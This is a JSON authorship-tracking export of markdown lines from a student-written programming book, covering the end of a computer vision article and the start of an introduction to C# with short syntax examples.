        "content": "With `BackgroundSubtractorMOG`:"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": "![Background subtracted](object-tracking-example-2.jpg \"MOG\")"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "With `BackgroundSubtractorMOG2`:"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": "![Background subtracted](object-tracking-example-3.jpg \"MOG2\")"
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "With `BackgroundSubtractorGMG`:"
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": "![Background subtracted](object-tracking-example-4.jpg \"GMG\")"
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## GPU-Accelerated Computer Vision"
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": "For computer vision systems, digital images are often translated into matrices, whose nature depends on the chosen color presentation. For example, an image in the RGB (Red, Green, Blue) color space will be presented by 3 matrices, each contains the color intensity of the individual pixels with regards to red, green, or blue. There are other color representations, such as the CMYK or the HSV that annotates the pixels\u0027 Hue, Saturation, and Value.\u003csup\u003e[[1]](#footnote1)\u003c/sup\u003e"
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": "Underneath, all computer vision algorithms deal with images as matrices, thus employ theories in Linear Algebra to process images. In computer hardware, there is a class of computing units that specializes in matrix operations called the Graphics Processing Units (GPUs) - their main purpose is to speed up heavy graphical tasks such as video rendering, gaming, or 3D modelling. Therefore, GPUs are well-suited to serve as computer vision computing units.\u003csup\u003e[[11]](#footnote11)\u003c/sup\u003e"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "Most prominent computer vision libraries such as OpenCV, dlib, or VisionWorks support the use of GPUs in the computing process. For example, OpenCV has APIs that allow a kernel process running on the CPU to transfer image matrices to one or more GPUs to perform heavy functions such as Gaussian filtering or image stitching.\u003csup\u003e[[12]](#footnote12)\u003c/sup\u003e Hardware manufacturers have even tried to ease the image transferring process between CPU and GPU, by introducing system memory regions accessible to both CPU and GPU.\u003csup\u003e[[13]](#footnote13)\u003c/sup\u003e"
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What\u0027s Next?"
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": "There is an abundance of resources to learn and apply computer vision; however, not all of them are free or beginner-friendly. This section mentions some great courses and tutorials that are freely accessible at the time of writing. If you are a starter, it is recommended that you follow these steps for your learning journey:"
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "-"
        },
        "content": "Firstly, you should acquire basic familiarity in Python, C++, or Java, as most tutorials and courses in CV use one of those languages:"
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "-"
        },
        "content": "- [Python For Beginners](https://www.python.org/about/gettingstarted/)"
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Learn C++](https://www.learncpp.com/)"
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "-"
        },
        "content": "- [Java Tutorial](https://www.tutorialspoint.com/java/index.htm)"
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "-"
        },
        "content": "Next, it is necessary that you gain some basic understandings in Linear Algebra:"
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "-"
        },
        "content": "- [Linear Algebra by Khan Academy](https://www.khanacademy.org/math/linear-algebra)"
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "-"
        },
        "content": "After getting comfortable with the language and the math, you should start with an entry-level computer vision course. This Udacity class pairs theoretical parts with very practical hands-on exercises:"
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "-"
        },
        "content": "- [Udacity: Introduction to computer vision by Georgia Tech](https://www.udacity.com/course/introduction-to-computer-vision--ud810)"
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "-"
        },
        "content": "This blog is from a self-taught computer vision developer, where you can find tutorials on more advanced topics in the field:"
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "-"
        },
        "content": "- [PyImageSearch](https://www.pyimagesearch.com/start-here-learn-computer-vision-opencv/)"
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 311,
        "author": {
          "gitId": "-"
        },
        "content": "Lastly, learning to master the wheel from those who implemented the wheel is always a good idea:"
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "-"
        },
        "content": "- [OpenCV Tutorials for C++](https://docs.opencv.org/3.4.0/d9/df8/tutorial_root.html)"
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "-"
        },
        "content": "or the Python version:"
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "-"
        },
        "content": "- [OpenCV Tutorials for Python](https://docs.opencv.org/3.0-beta/doc/py_tutorials/py_tutorials.html)"
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "-"
        },
        "content": "## References"
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote1\"\u003e[1]\u003c/a\u003e: https://en.wikipedia.org/wiki/Computer_vision\u003cbr /\u003e"
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote2\"\u003e[2]\u003c/a\u003e: https://courses.cs.washington.edu/courses/cse576/book/ch2.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote3\"\u003e[3]\u003c/a\u003e: https://blogs.nvidia.com/blog/2017/07/23/future-of-computer-vision/\u003cbr /\u003e"
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote4\"\u003e[4]\u003c/a\u003e: https://web.stanford.edu/class/cs231m/\u003cbr /\u003e"
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote5\"\u003e[5]\u003c/a\u003e: https://cloud.google.com/vision/\u003cbr /\u003e"
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote6\"\u003e[6]\u003c/a\u003e: http://cs231n.stanford.edu/\u003cbr /\u003e"
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote7\"\u003e[7]\u003c/a\u003e: https://www.cis.rit.edu/class/simg782/lectures/lecture_02/lec782_05_02.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote8\"\u003e[8]\u003c/a\u003e: https://karpathy.github.io/2014/09/02/what-i-learned-from-competing-against-a-convnet-on-imagenet/\u003cbr /\u003e"
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote9\"\u003e[9]\u003c/a\u003e: http://image-net.org/challenges/LSVRC/2016/%23det\u003cbr /\u003e"
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote10\"\u003e[10]\u003c/a\u003e: https://en.wikipedia.org/wiki/Video_tracking\u003cbr /\u003e"
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote11\"\u003e[11]\u003c/a\u003e: http://www.gipsa-lab.grenoble-inp.fr/summerschool/gpu/fichiers/GIPSA_talk.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote12\"\u003e[12]\u003c/a\u003e: https://docs.opencv.org/2.4/modules/gpu/doc/introduction.html\u003cbr /\u003e"
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote13\"\u003e[13]\u003c/a\u003e: https://devblogs.nvidia.com/beyond-gpu-memory-limits-unified-memory-pascal/\u003cbr /\u003e"
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote14\"\u003e[14]\u003c/a\u003e: https://pdfs.semanticscholar.org/fabf/4efa0ce7837f24b91c617cf9954fee1df50f.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote15\"\u003e[15]\u003c/a\u003e: https://www.cs.unc.edu/~wliu/papers/GoogLeNet.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote16\"\u003e[16]\u003c/a\u003e: https://www.cs.cmu.edu/~efros/courses/LBMV07/Papers/viola-cvpr-01.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote17\"\u003e[17]\u003c/a\u003e: http://personal.ee.surrey.ac.uk/Personal/R.Bowden/publications/avbs01/avbs01.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote18\"\u003e[18]\u003c/a\u003e: https://pdfs.semanticscholar.org/56b1/eee82a51ce17d72a91b5876a3281418679cc.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"footnote19\"\u003e[19]\u003c/a\u003e: https://www.sciencedirect.com/science/article/pii/S0167865505003521\u003cbr /\u003e"
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003ca name\u003d\"footnote20\"\u003e[20]\u003c/a\u003e: https://goldberg.berkeley.edu/pubs/acc-2012-visual-tracking-final.pdf\u003cbr /\u003e"
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 7,
      "jamessspanggg": 6,
      "iskandarzulkarnaien": 13,
      "-": 316
    }
  },
  {
    "path": "contents/csharp/IntroductionToCSharp.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to C#"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to C#"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "**Author(s:) [Yu Pei, Henry](https://github.com/YuPeiHenry)**\u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Chester Sng](https://github.com/ChesterSng), [Lin Si Jie](https://github.com/sijie123)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is C#‎](#what-is-c)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [C# Syntax Features‎](#c-syntax-features)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Object/Array/Collection Initializers‎](#object-array-collection-initializers)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Closures‎](#closures)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Nullable type‎](#nullable-type)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Other features](#other-features)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why Learn C#‎](#why-learn-c)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to Get Started‎](#how-to-get-started)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "## What is C#"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "C# is a _general purpose_, _multi-paradigm_, _garbage collected_, _cross-platform_ language by Microsoft, and part of the _.NET platform_. Some claim C# is Microsoft\u0027s answer to Java due to the fact that the two languages have a lot of similarities."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Given below are brief explanations of the key characteristics of C# mentioned above."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "* **General purpose**: "
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cblockquote\u003eIn computer software, a general-purpose programming language is a programming language designed to be used for writing software in the widest variety of application domains (a general-purpose language). A general-purpose programming language has this status because it does not include language constructs designed to be used within a specific application domain.\u003cbr\u003e--(source: [Wikipedia](https://en.wikipedia.org/wiki/General-purpose_programming_language))\u003c/blockquote\u003e"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "* **Multi-paradigm**: [_Programing Paradigms_](https://en.wikipedia.org/wiki/Programming_paradigm) are used to describe Programming Languages based on their features. Some commonly referred paradigms are [Object-Oriented Programming](https://en.wikipedia.org/wiki/Object-oriented_programming) (which primarily organizes code into objects that contain a state) and [Functional Programming](https://en.wikipedia.org/wiki/Functional_programming) (where code represents a sequence of stateless functions.) C# supports both Object-Oriented and Functional Programming, and many others that can be found [here](https://en.wikipedia.org/wiki/C_Sharp_(programming_language))."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "* **Garbage Collected**: The intialization, storage and handling of variables require memory. *Garbage Collection* is a form of automatic memory management, where memory that is no longer referenced by the program will be deallocated. You may read more about [Garbage Collection](https://en.wikipedia.org/wiki/Garbage_collection_(computer_science))."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "* **Cross-Platform**: [Cross-Platform](https://en.wikipedia.org/wiki/Cross-platform_software) software is software that can be run across multiple platforms, which may require recompilation depending on the software. Common platforms include Windows, MacOS and Linux, and for mobile platforms Android and iOS. The benefits of writing Cross-Platform software is that developers will only need to primarily maintain 1 code base and be able to deploy to multiple platforms."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "Below is an example of of a simple C# program:"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "```csharp"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "//Comments can be marked with // or /**/"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "//Namespaces are similar to packages, except the file does not need to be physically in the directory"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "using ProjectName.Utils;"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "namespace ProjectName.Model"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "    //Subclassing BaseClass"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "    class MyClass : BaseClass {"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "        ..."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "        //Method declaration"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "        public static void Main(String[] args) {"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "            //Variable definition"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "            string message \u003d \"Hello World!\";"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "            Console.WriteLine(message);"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "Developers that work with C# commonly use Visual Studio as their IDE and also as a build tool for compilation into common application/library formats, such as `.exe` or `.dll`. Using Visual Studio for C# development offers great convenience as it has an integrated testing framework, [MSTest](https://en.wikipedia.org/wiki/Visual_Studio_Unit_Testing_Framework)."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "## C# Syntax Features"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "This section covers some noteworthy features of C# syntax %%(some of them are found in other languages such as Java and Swift)%%."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "### Object/Array/Collection Initializers"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "In C#, you can construct an [Object](https://en.wikipedia.org/wiki/Object_(computer_science) \"In computer science, an object can be a variable, a data structure, a function, or a method, and as such, is a value in memory referenced by an identifier.\"), [Array](https://www.webopedia.com/TERM/A/array.html \"In programming, a series of objects all of which are the same size and type. Each object in an array is called an array element. For example, you could have an array of integers or an array of characters or an array of anything that has a defined data type.\") or [Collection](https://computersciencewiki.org/index.php/Collections \"A collection — sometimes called a container — is simply an object that groups multiple elements into a single unit.\") in a single statement as shown. This can be useful when writing tests, as test data will be better organised, as compared to calling the actual constructor."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "```csharp"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "public BookShelf(Book[] books, param2, param3, param4)"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "    this.books \u003d books"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "    // Do something with param 2, 3, 4"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "// Without use of Object Initializer"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "BookShelf shelf1 \u003d new BookShelf(books, param2, param3, param4)"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "// With use of Object Initializer"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "BookShelf shelf2 \u003d new BookShelf() {"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "    books \u003d { book1, book2 };"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "};"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "In the above example, we want to test a `BookShelf`\u0027s behaviors only related to the `Book[] array`. Instead of having to unnecessarily use param2, 3, 4 in construction, we can initialize a `BookShelf` only with the `Book[]` that we wanted to use."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "### Closures"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Sometimes, it may be useful to [defer execution](https://www.informit.com/articles/article.aspx?p\u003d2171751 \"Code that is executed only when results need to be evaluated. There are many reasons for executing code later\") or capture a local context for later execution. Context capturing is reflected below:"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "```csharp"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "//Capturing local context"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "public class Context"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "    //GetCounter returns a nullary (0 argument) function. The function returns an integer when executed."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "    public static Func\u003cInt\u003e GetCounter()"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "    {"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "        //Inside the context of this function, there is an integer variable count."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "        int count \u003d 0;"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "        //GetCounter is returning a function."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "        return () \u003d\u003e"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "        {"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "            //The function increments the count variable inside this context, which is initialized to 0."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "            count++;"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "            //It then returns the current count value."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "            return count;"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "Func\u003cInt\u003e counter \u003d Context.GetCounter();"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "//Every time the function is called, the variable count in the captured context would increment by 1, and its new value will be returned."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "counter(); //Returns 1"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "counter(); //Returns 2"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "The ability to capture the value `count` outside of the defined function scope that returns `count`, is called a closure. If you wish to read more about closures, you may consult [this article by dixin](https://weblogs.asp.net/dixin/understanding-csharp-features-6-closure)"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Nullable Type"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "Normally to guard against null pointers, an `if` branch or a guard clause that checks against `null` is used. Below is a code example of conventional null pointer handling."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "```csharp"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "public static Car ManufactureCar() {"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "    return (hasError) ? null : new Car(param1, param2);"
      },
      {
        "lineNumber": 133,
